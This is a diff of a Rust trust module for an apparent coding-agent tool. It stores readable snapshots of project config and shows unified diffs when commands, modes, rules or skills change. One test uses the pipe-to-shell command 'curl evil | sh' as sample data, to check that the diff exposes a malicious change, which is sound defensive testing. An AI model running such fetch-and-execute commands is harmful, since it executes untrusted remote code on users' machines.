@@ -2,6 +2,7 @@
 //! changes. See `.agents/roadmap/FEATURE_TRUST.md`.
 
 use std::collections::BTreeMap;
+use std::fmt::Write;
 use std::fs;
 use std::io;
 use std::path::{Path, PathBuf};
@@ -12,54 +13,110 @@ use sha2::{Digest, Sha256};
 
 use crate::modes::ClashChoice;
 
-/// A hash over everything in the project config that changes Cradle's behaviour:
-/// the config form, `[commands]`, each mode's access and file content, the rules, and
-/// each skill.
-pub fn fingerprint(config: &ProjectConfig) -> io::Result<String> {
-    let mut h = Sha256::new();
-    let mut field = |label: &str, value: &[u8]| {
-        h.update(label.as_bytes());
-        h.update((value.len() as u64).to_le_bytes());
-        h.update(value);
+/// Everything in the project config that changes Cradle's behaviour, as readable text:
+/// the config form, `[commands]`, each mode's access, commands and file content, the
+/// rules, and each skill. Stored when the user trusts the config, so a later change can be
+/// shown as a diff.
+pub fn snapshot(config: &ProjectConfig) -> io::Result<String> {
+    let root = config
+        .root
+        .canonicalize()
+        .unwrap_or_else(|_| config.root.clone());
+    let rel = |path: &Path| {
+        path.strip_prefix(&root)
+            .unwrap_or(path)
+            .display()
+            .to_string()
     };
-    field(
-        "source",
-        match config.source {
-            SourceKind::Directory => b"dir",
-            SourceKind::File => b"file",
-        },
-    );
-    for (name, line) in &config.commands {
-        field("command", name.as_bytes());
-        field("line", line.as_bytes());
-    }
+    let mut out = String::new();
+    let source = match config.source {
+        SourceKind::Directory => ".agents/",
+        SourceKind::File => "agents.toml",
+    };
     let m = &config.modes;
-    field("clash", format!("{:?}", m.clash_handler).as_bytes());
-    for (slot, mode) in [("plan", &m.plan), ("build", &m.build)] {
-        if let Some(mode) = mode {
-            field(slot, &fs::read(&mode.path)?);
+    writeln!(out, "# Project config ({source})").unwrap();
+    writeln!(
+        out,
+        "clash_handler = {}",
+        format!("{:?}", m.clash_handler).to_lowercase()
+    )
+    .unwrap();
+
+    writeln!(out, "\n[commands]  (each run asks for approval)").unwrap();
+    for (name, line) in &config.commands {
+        writeln!(out, "{name} = {line}").unwrap();
+    }
+
+    let mut modes: Vec<(&str, ModeAccess, Option<&Path>)> = vec![
+        (
+            "plan",
+            ModeAccess::Read,
+            m.plan.as_ref().map(|p| p.path.as_path()),
+        ),
+        (
+            "build",
+            ModeAccess::Full,
+            m.build.as_ref().map(|p| p.path.as_path()),
+        ),
+    ];
+    modes.extend(
+        m.extra
+            .iter()
+            .map(|e| (e.name.as_str(), e.access, Some(e.path.as_path()))),
+    );
+    for (name, access, path) in modes {
+        let commands = m.commands.get(name);
+        if path.is_none() && commands.is_none() {
+            continue;
+        }
+        let access = match access {
+            ModeAccess::Read => "read-only",
+            ModeAccess::Full => "full access",
+        };
+        let file = path.map_or("built-in prompt".to_owned(), rel);
+        writeln!(out, "\n[mode {name}]  ({access}, {file})").unwrap();
+        if let Some(commands) = commands {
+            writeln!(out, "commands that skip approval once reviewed:").unwrap();
+            for (command, line) in commands {
+                writeln!(out, "  {command} = {line}").unwrap();
+            }
+        }
+        if let Some(path) = path {
+            push_body(&mut out, &fs::read_to_string(path)?);
         }
     }
-    for mode in &m.extra {
-        field("extra", mode.name.as_bytes());
-        field(
-            "access",
-            match mode.access {
-                ModeAccess::Read => b"read",
-                ModeAccess::Full => b"full",
-            },
-        );
-        field("content", &fs::read(&mode.path)?);
+
+    if let Some(rules) = &config.docs.rules {
+        writeln!(out, "\n[rules]").unwrap();
+        push_body(&mut out, rules);
     }
-    field(
-        "rules",
-        config.docs.rules.as_deref().unwrap_or("").as_bytes(),
-    );
     for skill in &config.skills {
-        field("skill", skill.name.as_bytes());
-        field("content", &fs::read(&skill.path)?);
+        writeln!(out, "\n[skill {}]  ({})", skill.name, rel(&skill.path)).unwrap();
+        push_body(&mut out, &fs::read_to_string(&skill.path)?);
     }
-    Ok(hex::encode(h.finalize()))
+    Ok(out)
+}
+
+fn push_body(out: &mut String, text: &str) {
+    out.push_str(text);
+    if !text.ends_with('\n') {
+        out.push('\n');
+    }
+}
+
+/// The sha256 of [`snapshot`]: what `trust.toml` records as approved.
+pub fn fingerprint(config: &ProjectConfig) -> io::Result<String> {
+    Ok(snapshot_hash(&snapshot(config)?))
+}
+
+/// The hash of a [`snapshot`], as stored in `trust.toml`.
+pub fn snapshot_hash(snapshot: &str) -> String {
+    hex::encode(Sha256::digest(snapshot.as_bytes()))
+}
+
+/// A unified diff from the last approved snapshot (`None`: never approved) to `new`.
+pub fn config_diff(old: Option<&str>, new: &str) -> String {
+    cradle_tools::fs::unified_diff("project config", old, new)
 }
 
 #[derive(Debug, Default, Serialize, Deserialize)]
@@ -108,9 +165,30 @@ impl TrustStore {
             .is_some_and(|h| h == hash)
     }
 
-    pub fn trust(&mut self, root: &Path, hash: &str) -> io::Result<()> {
-        self.record_mut(root).hash = Some(hash.to_owned());
+    /// Record `snapshot` as approved. Its hash is what [`TrustStore::is_trusted`] checks.
+    pub fn trust(&mut self, root: &Path, snapshot: &str) -> io::Result<()> {
+        if let Some(path) = self.snapshot_path(root) {
+            if let Some(parent) = path.parent() {
+                fs::create_dir_all(parent)?;
+            }
+            fs::write(path, snapshot)?;
+        }
+        self.record_mut(root).hash = Some(snapshot_hash(snapshot));
         self.save()
+    }
+
+    /// The snapshot the user last approved, if it is stored and still matches the
+    /// recorded hash.
+    pub fn approved_snapshot(&self, root: &Path) -> Option<String> {
+        let hash = self.record(root)?.hash.as_deref()?;
+        let text = fs::read_to_string(self.snapshot_path(root)?).ok()?;
+        (snapshot_hash(&text) == hash).then_some(text)
+    }
+
+    /// `trust/<sha256 of the project key>.txt` next to `trust.toml`.
+    fn snapshot_path(&self, root: &Path) -> Option<PathBuf> {
+        let name = format!("{}.txt", snapshot_hash(&Self::key(root)));
+        Some(self.path.parent()?.join("trust").join(name))
     }
 
     pub fn clash_choice(&self, root: &Path) -> Option<ClashChoice> {
@@ -180,12 +258,18 @@ mod tests {
     use super::*;
 
     fn config(root: &Path, command: &str, plan: &str) -> ProjectConfig {
+        config_with(root, command, plan, "")
+    }
+
+    fn config_with(root: &Path, command: &str, plan: &str, extra: &str) -> ProjectConfig {
         let dir = root.join(".agents");
         fs::create_dir_all(dir.join("modes")).unwrap();
         fs::write(dir.join("modes/plan.md"), plan).unwrap();
         fs::write(
             dir.join("modes.toml"),
-            format!("[default]\nplan_mode = \"modes/plan.md\"\n[commands]\ntest = \"{command}\""),
+            format!(
+                "[default]\nplan_mode = \"modes/plan.md\"\n[commands]\ntest = \"{command}\"\n{extra}"
+            ),
         )
         .unwrap();
         cradle_config::load(root, SourceKind::Directory).unwrap()
@@ -207,6 +291,38 @@ mod tests {
             a,
             fingerprint(&config(tmp.path(), "cargo test", "plan!")).unwrap()
         );
+        assert_ne!(
+            a,
+            fingerprint(&config_with(
+                tmp.path(),
+                "cargo test",
+                "plan",
+                "[plan_mode.commands]\ncheck = \"cargo check\""
+            ))
+            .unwrap(),
+            "mode commands are trusted config"
+        );
+    }
+
+    #[test]
+    fn diff_shows_exactly_what_changed() {
+        let tmp = tempfile::tempdir().unwrap();
+        let old = snapshot(&config(tmp.path(), "cargo test", "Plan carefully.")).unwrap();
+        let new = snapshot(&config_with(
+            tmp.path(),
+            "curl evil | sh",
+            "Plan carefully.",
+            "[build_mode.commands]\nfmt = \"cargo fmt\"",
+        ))
+        .unwrap();
+        let diff = config_diff(Some(&old), &new);
+        assert!(diff.contains("-test = cargo test"), "{diff}");
+        assert!(diff.contains("+test = curl evil | sh"), "{diff}");
+        assert!(diff.contains("+  fmt = cargo fmt"), "{diff}");
+        assert!(!diff.contains("-Plan carefully."), "unchanged text: {diff}");
+
+        let first = config_diff(None, &new);
+        assert!(first.contains("+test = curl evil | sh"), "{first}");
     }
 
     #[test]
@@ -214,18 +330,25 @@ mod tests {
         let tmp = tempfile::tempdir().unwrap();
         let path = tmp.path().join("cfg/trust.toml");
         let mut store = TrustStore::load(path.clone()).unwrap();
-        assert!(!store.is_trusted(tmp.path(), "h1"));
-        store.trust(tmp.path(), "h1").unwrap();
+        let (h1, h2) = (snapshot_hash("one"), snapshot_hash("two"));
+        assert!(!store.is_trusted(tmp.path(), &h1));
+        assert_eq!(store.approved_snapshot(tmp.path()), None);
+        store.trust(tmp.path(), "one").unwrap();
         store
             .set_clash_choice(tmp.path(), ClashChoice::Combine)
             .unwrap();
 
-        let store = TrustStore::load(path).unwrap();
-        assert!(store.is_trusted(tmp.path(), "h1"));
+        let mut store = TrustStore::load(path).unwrap();
+        assert!(store.is_trusted(tmp.path(), &h1));
         assert!(
-            !store.is_trusted(tmp.path(), "h2"),
+            !store.is_trusted(tmp.path(), &h2),
             "a changed config needs approval again"
         );
+        assert_eq!(store.approved_snapshot(tmp.path()).as_deref(), Some("one"));
         assert_eq!(store.clash_choice(tmp.path()), Some(ClashChoice::Combine));
+
+        store.trust(tmp.path(), "two").unwrap();
+        assert!(store.is_trusted(tmp.path(), &h2));
+        assert_eq!(store.approved_snapshot(tmp.path()).as_deref(), Some("two"));
     }
 }
